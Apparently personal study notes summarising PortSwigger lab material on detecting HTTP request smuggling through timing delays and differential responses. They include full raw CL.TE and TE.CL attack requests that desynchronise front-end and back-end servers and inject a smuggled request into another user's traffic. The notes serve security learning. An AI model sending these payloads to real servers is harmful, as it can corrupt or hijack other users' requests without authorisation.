
https://portswigger.net/web-security/request-smuggling/finding
## 📌 Overview

Finding HTTP Request Smuggling (HRS) vulnerabilities requires **provoking differences in how front-end and back-end servers interpret requests**.

- The core idea is to craft **ambiguous HTTP messages** that cause servers to “wait” or “desync.”
    
- If a vulnerability exists, you can observe it through:
    
    - **Timing delays** (server stuck waiting).
        
    - **Differential responses** (evidence that one request interfered with another).
        

---

## 🕰️ Timing Techniques

### Why Timing Works

- If **servers disagree on boundaries**, one of them may wait for **more data** that never arrives.
    
- This **hangs the request**, producing an observable delay.
    
- Timing-based tests are **low-noise indicators** that something is wrong.
    

---

### ⏱️ Detecting CL.TE (Content-Length → Transfer-Encoding)

**Front-end uses CL**, **back-end uses TE**.

📌 **Payload**

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

💡 **Why it works**

- Front-end trusts **CL=4**, forwards only part of the request (`1\nA`).
    
- Back-end sees **TE: chunked** → expects another chunk after `A`.
    
- Since it never arrives, the back-end **waits**, causing a delay.
    

---

### ⏱️ Detecting TE.CL (Transfer-Encoding → Content-Length)

**Front-end uses TE**, **back-end uses CL**.

📌 **Payload**

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

💡 **Why it works**

- Front-end interprets request as **chunked**, stops at `0`.
    
- Back-end uses **CL=6**, so it expects **more bytes**.
    
- Back-end waits for missing data (`X` is ignored), creating a delay.
    

---

⚠️ **Important Testing Note**

- Always test **CL.TE first**.
    
- If the app is vulnerable to CL.TE, sending a TE.CL test could disrupt other users (their requests get stuck).
    

---

## 📑 Confirming Vulnerabilities – Differential Responses

### Why Differential Responses?

Timing only tells you _something is wrong_.  
Differential responses **prove exploitability** by showing one request **modifies another**.

🔬 Strategy:

1. Send an **attack request** that spills into the next request.
    
2. Immediately send a **normal request**.
    
3. If the normal request is corrupted, the vulnerability is confirmed.

---

### ✅ Confirming CL.TE via Differential Responses

**Attack Request**

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

**Why it works**

- Front-end trusts **CL=49**, sends full body to back-end.
    
- Back-end uses **TE: chunked** → interprets `GET /404` as the **start of a new request**.
    
- This “smuggled” request **bleeds into the next user’s request**.
    

**Normal Request**

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

💥 Result:  
The normal request is corrupted:

```http
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
...
```

Back-end returns `404` → clear evidence of CL.TE vulnerability.

https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses
---

### ✅ Confirming TE.CL via Differential Responses

**Attack Request**

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

⚠️ _Setup for Burp:_

- Uncheck **"Update Content-Length"** in Repeater.
    
- Ensure request ends with `\r\n\r\n` after final `0`.
    

**Why it works**

- Front-end processes **chunked body** until `0`.
    
- Back-end relies on **CL=4**, so it **splits differently**.
    
- `GET /404` gets injected into the next request.
    

**Normal Request** (same as above).  
Result: Corrupted with `GET /404`, proving TE.CL vulnerability.

https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses

---

STEPS:
![[Pasted image 20250818115408.png]]



![[Pasted image 20250818114118.png]]
Backend Timeout = CL.TE vulnerability![[Pasted image 20250818114242.png]]

![[Pasted image 20250818114559.png]]




Front-end Rejected = TE.{CL OR TE}![[Pasted image 20250818120106.png]]

Back-end Timeout = TE.CL
![[Pasted image 20250818120439.png]]
## ⚠️ Key Considerations When Testing

- **Separate Connections:** Attack & normal requests must use **different TCP connections**. If both are sent over the same one, smuggling won’t be detected.
    
- **Consistency:** Use the **same URL and parameters** for both requests → ensures they hit the same back-end.
    
- **Race Condition:** Must send normal request **immediately after** attack. On busy apps, retry multiple times.
    
- **Load Balancers:** Requests may be routed to different back-ends. Multiple attempts may be needed.
    
- **Impact on Others:** If your smuggled payload interferes with another user instead of your test request, you’ve disrupted them. Proceed with **extreme caution**.
    

---

## 🧠 Key Takeaways

- **Timing tests** reveal possible smuggling → server waits for incomplete request.
    
- **Differential responses** confirm smuggling → one request corrupts the next.
    
- **CL.TE vs TE.CL:** Test in order (CL.TE first) to avoid collateral disruption.
    
- **Testing must be careful** → vulnerable sites can affect other users if probed recklessly.
    

---

